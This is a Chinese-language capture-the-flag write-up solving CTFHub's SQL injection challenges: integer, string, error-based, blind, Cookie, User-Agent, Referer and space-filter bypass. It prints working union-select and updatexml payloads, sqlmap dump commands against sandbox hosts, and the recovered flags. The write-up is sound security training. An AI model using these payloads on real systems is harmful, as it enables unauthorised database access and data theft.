# Web

## Web前置技能

### SQL注入

Web应用开发过程中，为了内容的快速更新，很多开发者使用数据库进行数据存储。而由于开发者在程序编写过程中，传入用户数据的过滤不严格，将可能存在的攻击载荷拼接到SQL查询语句中，再将这些查询语句传递给后端的数据库执行，从而引发实际执行的语句与预期功能不一致的情况。这种攻击被称为**SQL注入攻击**。
大多数应用在开发时将诸如密码等的数据放在数据库中，由于SQL注入攻击能够泄露系统中的敏感信息，使之成为了进入各Web系统的入口级漏洞，因此各大CTF赛事将SQL注入作为Web题目的出题点之一，SQL注入漏洞也是现实场景下最常见的漏洞类型之一。
**SQL注入是开发者对用户输入的参数过滤不严格，导致用户输入的数据能够影响预设查询功能的一种技术，通常将导致数据库的原有信息泄露、篡改，甚至被删除。**

#### 整数型SQL注入

输入1试试？输入1后有俩行回显：一行`ID`一行`Data`。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/1.png)

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`group_concat()`把产生的同一分组中的值用`,`连接形成一个字符串，`information_schema.schemata`表示`information_schema`库中的一个表名为`schemata`的表，可以在输入框输入以下代码查询所有数据库：

```sql
-1 union select 1,group_concat(schema_name) from information_schema.schemata
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/2.png)

`database()`回显当前连接的数据库，用以下代码可以查询到当前数据库为`sqli`：

```sql
-1 union select 1,database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/3.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema="sqli"
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/4.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`flag`，我们可以去查询该表的列信息：

```sql
-1 union select 1,group_concat(column_name) from information_schema.columns where table_name="flag"
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/5.png)

最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```sql
-1 union select 1,group_concat(flag) from sqli.flag
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/6.png)

提交`ctfhub{b797799cfa5883e9255774f0}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/7.png)

------

#### 字符型注入

输入1试试？输入1后有俩行回显：一行`ID`一行`Data`，可以看到是`ID`是字符型。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/1.png)

`database()`回显当前连接的数据库，用`#`注释掉后面的那一个`'`，输入以下代码可以查询到当前数据库为`sqli`：

```sql
-1' union select 1,database()#
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/2.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，输入以下代码能够查询到指定数据库的表信息：

```sql
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'#
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/3.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，上图查询到有个表叫`flag`，我们可以去查询该表的列信息：

```sql
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'#
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/4.png)

最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```sql
-1' union select 1,group_concat(flag) from sqli.flag#
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/5.png)

提交`ctfhub{7c61389921cf96d14f3df6f9}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/6.png)

------

#### 报错注入

**某些网站为了方便开发者调试会开启错误调试信息，只要此时触发SQL语句的错误就能在页面上看到SQL语句执行后的报错信息，这种攻击方式被称为报错注入。**

输入1试试？输入1后只有一行回显：查询正确。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/1.png)

通过查阅相关文档可知`updatexml()`在执行时，第二个参数应该是合法的XPATH路径，否则将会在引发报错的同时将传入的参数进行输出。`database()`回显当前连接的数据库，输入以下代码可以查询到当前数据库：

```sql
1 and (updatexml(1,concat(0x7e,(database()),0x7e),1))
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/2.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，输入以下代码能够查询到指定数据库的表信息：

```sql
1 union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='sqli'),0x7e),1)
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/3.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，上图查询到有个表叫`flag`，我们可以去查询该表的列信息：

```sql
1 union select updatexml(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag')  ,0x7e),1)
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/4.png)

最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```sql
1 union select updatexml(1,concat(0x7e, (select group_concat(flag) from sqli.flag)  ,0x7e),1)
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/5.png)

提交`ctfhub{ce93ca39df4e9cbeee0c79c5}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/6.png)

------

#### 布尔盲注

这道题如果真的盲注的话会很费劲，直接启动`Kali-Linux`用`sqlmap`爆破就完事啦。

爆破出当前数据库的名字。

```sql
sqlmap -u "http://challenge-68c4a9c7f10ce011.sandbox.ctfhub.com:10800/?id=1" --current-db
#可以得到如下有用的结果信息(简洁版)
current database: 'sqli'
```

得到数据库名后继续爆破表信息：

```bash
sqlmap -u "http://challenge-68c4a9c7f10ce011.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables
#可以得到如下有用的结果信息(简洁版)
+------+
| flag |
+------+
| news |
+------+
```

知道有个叫`flag`的表后，可以查看该表的字段信息：

```bash
sqlmap -u "http://challenge-68c4a9c7f10ce011.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag --columns
#可以得到如下有用的结果信息(简洁版)
+-----------------------+
| Column | Type         |
+-----------------------+
| flag   | varchar(100) |
+-----------------------+
```

最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```bash
sqlmap -u "http://challenge-68c4a9c7f10ce011.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag -C flag --dump
#可以得到如下有用的结果信息(简洁版)
+----------------------------------+
| flag                             |
+----------------------------------+
| ctfhub{64a098acea7e72aefc09810f} |
+----------------------------------+
```

提交`ctfhub{64a098acea7e72aefc09810f}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/布尔盲注/1.png)

------

#### 时间盲注

时间盲注攻击是利用`sleep()`或`benchmark()`等函数让`mysql`执行时间变长，经常与`if(expr1,expr2,expr3)`语句结合使用，通过页面的响应时间来判断条件是否正确。`if(expr1,expr2,expr3)`含义是：如果`expr1`为`True`则返回`expr2`，否则返回`expr3`。

这道题如果真的盲注的话会很费劲，直接启动`Kali-Linux`用`sqlmap`爆破就完事啦。

```sql
sqlmap -u "http://challenge-eccdebff49cb9b7c.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag --columns --dump
#可以得到如下有用的结果信息(简洁版)
+----------------------------------+
| flag                             |
+----------------------------------+
| ctfhub{661f441db8300ee13ac86d2b} |
+----------------------------------+
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/时间盲注/1.png)

提交`ctfhub{661f441db8300ee13ac86d2b}`即可。

------

#### MySQL结构

输入1试试？输入1后有俩行回显：一行`ID`一行`Data`。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/1.png)

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`group_concat()`把产生的同一分组中的值用`,`连接形成一个字符串，`information_schema.schemata`表示`information_schema`库中的一个表名为`schemata`的表，可以在输入框输入以下代码查询所有数据库：

```sql
-1 union select 1,group_concat(schema_name) from information_schema.schemata
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/2.png)

`database()`回显当前连接的数据库，用以下代码可以查询到当前数据库为`sqli`：

```bash
-1 union select 1,database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/3.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，输入以下代码能够查询到指定数据库的表信息：

```sql
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema="sqli"
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/4.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，上图查询到有个表叫`dmyireyrij`，我们可以去查询该表的列信息：

```sql
-1 union select 1,group_concat(column_name) from information_schema.columns where table_name="dmyireyrij"
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/5.png)

上图查询到表`dmyireyrij`中有个列叫`wqnbddiwzu`，最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```sql
-1 union select 1,group_concat(wqnbddiwzu) from sqli.dmyireyrij
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/6.png)

提交`ctfhub{a251a62c47aa8b3c139cf2e4}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/7.png)

------

#### Cookie注入

**解法1：**`Burp Suite`

首先用`Burp Suite`抓包`id%E8%BE%93%E5%85%A51%E8%AF%95%E8%AF%95%EF%BC%9F`进行`url`解码结果为`id输入1试试？`。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/1.png)

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`database()`回显当前连接的数据库，修改`Cookie`为以下代码可以查询到当前数据库为`sqli`：

```sql
id=-1 union select 1, database();
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/2.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
id=-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli';
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/3.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`gsilsvtvjn`，我们可以去查询该表的列信息：

```sql
id=-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='gsilsvtvjn';
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/4.png)

最后输入以下代码根据`ywcxnnlyfe`字段可以查询到该字段的数据：

```sql
id=-1 union select 1, group_concat(ywcxnnlyfe) from sqli.gsilsvtvjn;
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/5.png)

提交`ctfhub{9a3c5a851a615b8332cbe20b}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/6.png)

------

**解法2：**`sqlmap`

`sqlmap`中有一个参数是`--level`，表示探测等级，其默认值为`1`，`level>=2`时会检测`Cookie`注入，`level>=3`时会检测`User-Agent`注入和`Referer`注入，`level>=5`时会检测`host`注入。以下代码可以爆破出当前网站中的所有数据库：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 --dbs
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/7.png)

爆破出当前数据库的名字：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 --current-db
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/8.png)

得到数据库名`sqli`后继续爆破表信息：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 -D sqli --tables
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/9.png)

知道有个叫`gsilsvtvjn`的表后，可以查看该表的字段信息：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 -D sqli -T gsilsvtvjn --columns
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/10.png)

最后输入以下代码根据`ywcxnnlyfe`字段可以查询到该字段的数据：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 -D sqli -T gsilsvtvjn -C ywcxnnlyfe --dump 
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/11.png)

提交`ctfhub{9a3c5a851a615b8332cbe20b}`即可。

------

#### UA注入

**解法1：**`Burp Suite`

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`database()`回显当前连接的数据库，修改`User-Agent`为以下代码可以查询到当前数据库为`sqli`：

```sql
-1 union select 1, database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/1.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/2.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`ulxbfmsgqx`，我们可以去查询该表的列信息：

```sql
-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='ulxbfmsgqx'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/3.png)

最后输入以下代码根据`zpmjyijptn`字段可以查询到该字段的数据：

```sql
-1 union select 1, group_concat(zpmjyijptn) from sqli.ulxbfmsgqx
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/4.png)

提交`ctfhub{85809c1cc35e607a1b7fed0a}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/5.png)

------

**解法2：**`sqlmap`

`sqlmap`中有一个参数是`--level`，表示探测等级，其默认值为`1`，`level>=2`时会检测`Cookie`注入，`level>=3`时会检测`User-Agent`注入和`Referer`注入，`level>=5`时会检测`host`注入。以下代码可以爆破出当前网站中的所有数据库：

```bash
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 --dbs
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/6.png)

爆破出当前数据库的名字：

```bash
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 --current-db
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/7.png)

得到数据库名`sqli`后继续爆破表信息：

```sql
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 -D sqli --tables
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/8.png)

知道有个叫`ulxbfmsgqx`的表后，可以查看该表的字段信息：

```sql
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T ulxbfmsgqx --columns
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/9.png)

最后输入以下代码根据`zpmjyijptn`字段可以查询到该字段的数据：

```sql
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T ulxbfmsgqx -C zpmjyijptn --dump
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/10.png)

提交`ctfhub{85809c1cc35e607a1b7fed0a}`即可。


------

#### Refer注入

**解法1：**`Burp Suite`

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`database()`回显当前连接的数据库，修改`Referer`为以下代码可以查询到当前数据库为`sqli`：

```sql
-1 union select 1, database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/1.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/2.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`dirxpetuan`，我们可以去查询该表的列信息：

```sql
-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='dirxpetuan'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/3.png)

最后输入以下代码根据`jfsxcgbxrx`字段可以查询到该字段的数据：

```sql
-1 union select 1, group_concat(jfsxcgbxrx) from sqli.dirxpetuan
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/4.png)

提交`ctfhub{e82d7ab14d58dd03f08c3ce4}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/5.png)

------

**解法2：**`sqlmap`

`sqlmap`中有一个参数是`--level`，表示探测等级，其默认值为`1`，`level>=2`时会检测`Cookie`注入，`level>=3`时会检测`User-Agent`注入和`Referer`注入，`level>=5`时会检测`host`注入。以下代码可以爆破出当前网站中的所有数据库：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 --dbs
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/6.png)

爆破出当前数据库的名字：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 --current-db
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/7.png)

得到数据库名`sqli`后继续爆破表信息：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 -D sqli --tables
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/8.png)

知道有个叫`dirxpetuan`的表后，可以查看该表的字段信息：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T dirxpetuan --columns
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/9.png)

最后输入以下代码根据`jfsxcgbxrx`字段可以查询到该字段的数据：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T dirxpetuan -C jfsxcgbxrx --dump
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/10.png)

提交`ctfhub{e82d7ab14d58dd03f08c3ce4}`即可。

------

#### 空格过滤

输入1试试？输入1后有俩行回显：一行`ID`一行`Data`。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/1.png)

当`sql`中的空格被过滤时可以用`/**/`来代替。`database()`回显当前连接的数据库，用以下代码可以查询到当前数据库为`sqli`：

```sql
-1/**/union/**/select/**/1,database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/2.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='sqli'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/3.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`nbadikctna`，我们可以去查询该表的列信息：

```bash
-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='nbadikctna'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/4.png)

最后输入以下代码根据`vuafekfves`字段可以查询到该字段的数据：

```sql
-1/**/union/**/select/**/1,group_concat(vuafekfves)/**/from/**/sqli.nbadikctna
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/5.png)

提交`ctfhub{12917a7f5475c0de901aec7c}`即可。

------

